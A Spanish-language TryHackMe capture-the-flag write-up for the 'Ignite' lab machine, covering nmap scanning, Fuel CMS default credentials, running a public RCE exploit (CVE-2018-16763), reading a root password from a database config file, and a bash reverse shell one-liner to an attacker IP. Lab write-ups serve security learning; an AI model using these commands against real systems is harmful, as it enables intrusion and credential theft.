---
title: Ignite Writeup - TryHackMe
date: 2023-06-08
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, CMS Fuel]
img_path: /assets/img/commons/ignite/
image: ignite.png
---

¡Saludos!

En este writeup, nos sumergiremos en la máquina [**Ignite**](https://tryhackme.com/room/ignite) de **TryHackMe**, clasificada con un nivel de dificultad fácil según la plataforma. Se trata de una máquina **Linux** en la que realizaremos una enumeración web para identificar la ruta de **configuración de la base de datos** del CMS Fuel, así como las **credenciales por defecto** que nos permitirán acceder al panel de inicio de sesión. Para obtener acceso al servidor, utilizaremos un exploit de **Remote Code Execution** y luego escalaremos privilegios mediante la **recuperación de la contraseña del usuario root** en el archivo de configuración de la base de datos.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.226.203
PING 10.10.226.203 (10.10.226.203) 56(84) bytes of data.
64 bytes from 10.10.226.203: icmp_seq=1 ttl=61 time=313 ms

--- 10.10.226.203 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 313.100/313.100/313.100/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.226.203 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 22:14 -05
Nmap scan report for 10.10.226.203
Host is up (0.30s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.67 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 80 -sV -sC --min-rate 5000 10.10.226.203 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 22:16 -05
Nmap scan report for 10.10.226.203
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.53 seconds
```

El reporte nos muestra que en la máquina víctima solo hay un servicio **HTTP** (`Apache 2.4.18`) en funcionamiento.

### HTTP - 80

Al ingresar al sitio web, nos aparece la página de **Fuel CMS**, donde se muestra la version empleada (`1.4`) y donde se explican los pasos a seguir para iniciar con el CMS.

![web](web.png)

En el paso 2 (**Install the database**) se indica un archivo de configuración de la base de datos (`fuel/application/config/database.php`) que contiene el usuario y la contraseña.

![database](database.png)

Finalmente, se señala una ruta a un panel de acceso `/fuel`, cuyas credenciales predeterminadas son `username: admin` y `password:admin`.

![credentials](credentials.png)

Esa ruta también la podemos encontrar en el archivo `robots.txt`.

![robots](robots.png)

Al ingresar a la ruta, se nos dirige al siguiente panel de acceso.

![login](login.png)

Utilizamos las credenciales predeterminadas y conseguimos acceder al dashboard.

![dashboard](dashboard.png)

Como conocemos el CMS usado y su versión, podemos realizar una búsqueda de posibles exploits con la herramienta `searchploit`.

```bash
❯ searchsploit Fuel CMS 1.4
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                          | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                          | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                          | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                         | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                    | php/webapps/48778.txt
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Explotación

---

Encontramos varios exploits de **Ejecución Remota de Código**, en este caso usamos el exploit más reciente y hacemos un mirror del exploit `php/webapps/50477.py` con el siguiente comando.

```bash
❯ searchsploit -m php/webapps/50477.py
  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
      URL: https://www.exploit-db.com/exploits/50477
     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/juanr/CTF/THM/Ignite/exploits/50477.py
```

Lo ejecutamos para comprobar los parámetros necesarios para realizar el exploit.

```bash
❯ python3 50477.py
usage: python3 50477.py -u <url>
```

Vemos que el único parámetro necesario es la url del CMS, así que lo indicamos. 

Al ejecutar el exploit comprobamos que tenemos ejecución remota de código, empleamos el comando `whoami` para verificar que usuario somos y comprobamos que somos `www-data`.

```bash
❯ python3 50477.py -u http://10.10.226.203
[+]Connecting...
Enter Command $whoami
systemwww-data
```

Comprobamos en qué ruta nos encontramos actualmente y listamos los archivos y directorios.

```bash
Enter Command $pwd
system/var/www/html

Enter Command $ls  
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
```

Si recordamos, en la página principal del CMS se nos indicaba el archivo `fuel/application/config/database.php` que contiene un usuario y una contraseña potencial.

```bash
Enter Command $cat fuel/application/config/database.php

[...]

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

[...]
```

Podemos emplear estas credenciales para intentar cambiar al usuario `root`, pero para ello primero deberemos obtener acceso a la máquina.

Aprovechando que podemos realizar ejecución remota de código, leemos la primera flag en la ruta principal del usuario `www-data`.

```bash
Enter Command $ls /home
systemwww-data

Enter Command $ls /home/www-data
systemflag.txt

Enter Command $cat /home/www-data/flag.txt
system6470e394cbf6********************
```

Para ganar acceso simplemente ejecutamos el siguiente comando para obtener una reverse shell.

```bash
Enter Command $bash -c "bash -i >& /dev/tcp/10.2.11.100/443 0>&1"
```

Una vez puesto en escucha en el puerto especificado en el comando anterior, obtenemos acceso al servidor.

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.226.203] 40702
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$
```

## Escalación de privilegios

---

Una vez obtenido el acceso, seguimos los pasos detallados en [Tratamiento de la TTY](https://itzjp-sec.github.io/posts/tratamiento-tty/) para conseguir una shell más interactiva y funcional.

Después, intentamos cambiar al usuario `root` con la contraseña encontrada anteriormente en la configuración de la base de datos.

```bash
www-data@ubuntu:/var/www/html$ su root
Password: 
root@ubuntu:/var/www/html# whoami
root
```

Una vez que somos usuario `root`, solo tenemos que entrar en su directorio y conseguir la última flag de la máquina.

```bash
root@ubuntu:/var/www/html# cd
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
b9bbcb33e11b80be7***************
```

!Happy Hacking¡
